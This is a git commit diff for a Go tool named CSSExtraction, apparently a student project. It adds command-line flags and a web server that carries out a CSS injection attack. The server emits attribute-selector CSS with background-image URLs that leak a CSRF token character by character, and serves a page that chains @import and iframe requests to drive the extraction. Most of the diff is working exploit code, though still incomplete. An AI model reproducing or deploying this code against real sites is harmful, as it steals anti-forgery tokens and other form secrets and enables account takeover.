6bb7a67a772657e6ebc381fd51d1f27e7e085e56
Thomas GREGOIRE <thomas.gregoire@etu.univ-grenoble-alpes.fr>
2025-09-27 19:43:00 +0200

    First Version

--- cmd/root.go
+++ cmd/root.go
@@ -8,7 +8,11 @@ import (
 )
 
 var (
-	port int
+	port       int
+	secret     string
+	listOfChar string
+	verbose    bool
+	lenSecret  int
 )
 
 // rootCmd represents the base command when called without any subcommands
@@ -23,13 +27,17 @@ Usage :
 CSSExtraction [flags]
 
 Flags:
--h, --help		Show this message
--p, --port		Port to run the server on (default 8080)`,
+-h, --help	|	Show this message
+-p, --port	|	Port to run the server on (default : 8080)
+-s, --secret	|	The name of the secret that must be extracted (default : "csrf")
+-l, --listChar	|	List of char that can compose the secret (default : "abcdefghijklmnopqrstuvwxyz0123456789")
+-v --verbose	|	Activate verbose mode (default : False)
+-n, --lenSecret	|	The size of the secret. Should be equal or bigger than the real size of the secret (default : 30)`,
 }
 
 func Execute() {
 	err := rootCmd.Execute()
-	server.LaunchServer(port)
+	server.StartTool(port, secret, listOfChar, verbose, lenSecret)
 
 	if err != nil {
 		os.Exit(1)
@@ -37,6 +45,10 @@ func Execute() {
 }
 
 func init() {
+	rootCmd.PersistentFlags().IntVarP(&lenSecret, "sizeSecret", "n", 30, "The size of the secret. Should be equal or bigger than the real size of the secret")
 	rootCmd.PersistentFlags().IntVarP(&port, "port", "p", 8080, "Port to run the webpage on")
+	rootCmd.PersistentFlags().StringVarP(&secret, "secret", "s", "csrf", "The name of the secret that must be extracted")
+	rootCmd.PersistentFlags().StringVarP(&listOfChar, "listChar", "l", "abcdefghijklmnopqrstuvwxyz0123456789", "List of char that can compose the secret")
 	rootCmd.PersistentFlags().BoolP("help", "h", true, "Show the help message")
+	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "Activate verbose mode")
 }
--- server/server.go
+++ server/server.go
@@ -6,22 +6,78 @@ import (
 	"strconv"
 )
 
-func hello(rw http.ResponseWriter, req *http.Request) {
+var (
+	secretName    string
+	currentSecret string
+	listOfChar    string
+	verbose       bool
+	lenSecret     int
+)
 
-	fmt.Fprintf(rw, "Hello")
+func hello(rw http.ResponseWriter, req *http.Request) {
+	if verbose {
+		fmt.Print("[DEBUG] Request made to \"hello/\"\n")
+	}
+
+	var webpage string = `
+	<html>
+		<style> @import url("/launchAttack"); </style>
+		<input name="csrf" value="abc123" class="csrf">
+	</html>
+	`
+
+	fmt.Fprint(rw, webpage)
 }
 
 func attack(rw http.ResponseWriter, req *http.Request) {
-	fmt.Fprintf(rw, "U r under attack :)")
+
+	if verbose {
+		fmt.Print("[DEBUG] Request made to \"attack/\"\n")
+	}
+
+	var css string = createCSS()
+
+	fmt.Fprint(rw, css)
 
 }
 
 func launchAttack(rw http.ResponseWriter, req *http.Request) {
-	fmt.Fprintf(rw, "U will be hacked :)")
+	var webpage string = ""
+
+	if verbose {
+		fmt.Print("[DEBUG] Request made to \"launchAttack/\"\n")
+	}
+
+	for i := range lenSecret {
+		webpage += "<style> @import url(\"/attack?len=" + strconv.Itoa(i) + "\")</style>\n"
+	}
+	webpage += "<iframe src=\"/launchAttack\"> </iframe>"
+
+	fmt.Fprint(rw, webpage)
+}
+
+func createCSS() string {
+	var css string = ""
+	for _, ch := range listOfChar {
+		css += "input[name=" + secretName + "][value^=" + currentSecret + string(ch) + "]"
+		css += "{\n\tbackground-image: url(https://localhost.com/attack/" + string(ch) + ");\n}\n\n"
+	}
+
+	return css
 
 }
 
-func LaunchServer(port int) {
+func StartTool(port int, secret string, listChar string, v bool, ls int) {
+	secretName = secret
+	currentSecret = ""
+	listOfChar = listChar
+	verbose = v
+	lenSecret = ls
+
+	launchServer(port)
+}
+
+func launchServer(port int) {
 
 	fmt.Printf("Server launch on port %d\n", port)
 
